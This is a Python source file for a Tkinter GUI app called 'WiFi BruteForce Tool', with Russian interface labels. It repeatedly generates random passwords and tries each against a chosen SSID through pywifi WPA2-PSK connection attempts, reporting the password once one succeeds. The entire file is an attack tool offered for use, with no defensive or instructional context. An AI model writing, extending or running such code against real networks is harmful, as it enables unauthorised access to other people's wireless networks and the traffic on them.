import random
import pywifi
from pywifi import const
import time
import tkinter as tk
from tkinter import ttk, messagebox


class WiFiBruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi BruteForce Tool")
        self.root.geometry("550x450")
        self.root.resizable(False, False)

        self.running = False
        self.attempts = 0
        self.start_time = 0

        self.allowed_chars = [
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '-',
            '=', '[', ']', '{', '}', '|', ';', ':', '"', "'", '<', '>', ',',
            '.', '?', '/', '~', '`'
        ]

        self.create_widgets()

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(main_frame, text="WiFi SSID:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.ssid_entry = ttk.Entry(main_frame, width=30)
        self.ssid_entry.grid(row=0, column=1, sticky=tk.EW, pady=5)

        ttk.Label(main_frame, text="Длина пароля:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.length_entry = ttk.Entry(main_frame, width=10)
        self.length_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
        self.length_entry.insert(0, "8")

        self.start_btn = ttk.Button(main_frame, text="Старт", command=self.start_attack)
        self.start_btn.grid(row=2, column=0, columnspan=2, pady=10)

        self.stop_btn = ttk.Button(main_frame, text="Стоп", command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.grid(row=3, column=0, columnspan=2, pady=5)

        ttk.Label(main_frame, text="Статус:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.status_label = ttk.Label(main_frame, text="Готов к работе")
        self.status_label.grid(row=4, column=1, sticky=tk.W, pady=5)

        ttk.Label(main_frame, text="Попыток:").grid(row=5, column=0, sticky=tk.W, pady=5)
        self.attempts_label = ttk.Label(main_frame, text="0")
        self.attempts_label.grid(row=5, column=1, sticky=tk.W, pady=5)

        ttk.Label(main_frame, text="Текущий пароль:").grid(row=6, column=0, sticky=tk.W, pady=5)
        self.password_label = ttk.Label(main_frame, text="")
        self.password_label.grid(row=6, column=1, sticky=tk.W, pady=5)

        ttk.Label(main_frame, text="Скорость:").grid(row=7, column=0, sticky=tk.W, pady=5)
        self.speed_label = ttk.Label(main_frame, text="0 попыток/сек")
        self.speed_label.grid(row=7, column=1, sticky=tk.W, pady=5)

        ttk.Label(main_frame, text="Лог:").grid(row=8, column=0, sticky=tk.NW, pady=5)
        self.log_text = tk.Text(main_frame, height=8, width=50, state=tk.DISABLED)
        self.log_text.grid(row=8, column=1, sticky=tk.EW, pady=5)

        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        scrollbar.grid(row=8, column=2, sticky=tk.NS)
        self.log_text['yscrollcommand'] = scrollbar.set

    def log_message(self, message):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def connect_to_wifi(self, ssid, password):
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]

            iface.disconnect()
            time.sleep(0.5)

            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)

            for _ in range(3):
                if iface.status() == const.IFACE_CONNECTED:
                    return True
                time.sleep(1)

            return False

        except Exception as e:
            self.log_message(f"Ошибка подключения: {str(e)}")
            return False

    def update_stats(self):
        elapsed = time.time() - self.start_time
        speed = self.attempts / elapsed if elapsed > 0 else 0
        self.speed_label.config(text=f"{speed:.1f} попыток/сек")

        if self.running:
            self.root.after(1000, self.update_stats)

    def start_attack(self):
        ssid = self.ssid_entry.get()
        length = self.length_entry.get()

        if not ssid:
            messagebox.showerror("Ошибка", "Введите SSID сети")
            return

        try:
            length = int(length)
            if length < 4 or length > 20:
                raise ValueError
        except ValueError:
            messagebox.showerror("Ошибка", "Длина пароля должна быть числом от 4 до 20")
            return

        self.running = True
        self.attempts = 0
        self.start_time = time.time()

        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_label.config(text="В процессе...")

        self.log_message(f"Начало атаки на сеть: {ssid}")
        self.log_message(f"Длина пароля: {length} символов")

        self.update_stats()
        self.attack_loop(ssid, length)

    def stop_attack(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Остановлено пользователем")
        self.log_message("Атака остановлена")

    def attack_loop(self, ssid, length):
        if not self.running:
            return

        password = ''.join(random.choice(self.allowed_chars) for _ in range(length))
        self.attempts += 1

        self.attempts_label.config(text=str(self.attempts))
        self.password_label.config(text=password)
        self.root.update()

        if self.connect_to_wifi(ssid, password):
            self.running = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.status_label.config(text="Успешно!")

            elapsed = time.time() - self.start_time
            speed = self.attempts / elapsed if elapsed > 0 else 0

            self.log_message(f"УСПЕХ! Пароль найден: {password}")
            self.log_message(f"Попыток: {self.attempts}")
            self.log_message(f"Время: {elapsed:.1f} сек")
            self.log_message(f"Скорость: {speed:.1f} попыток/сек")

            messagebox.showinfo("Успех", f"Пароль найден: {password}\nПопыток: {self.attempts}")
            return

        if self.running:
            self.root.after(10, lambda: self.attack_loop(ssid, length))


if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiBruteForceApp(root)
    root.mainloop()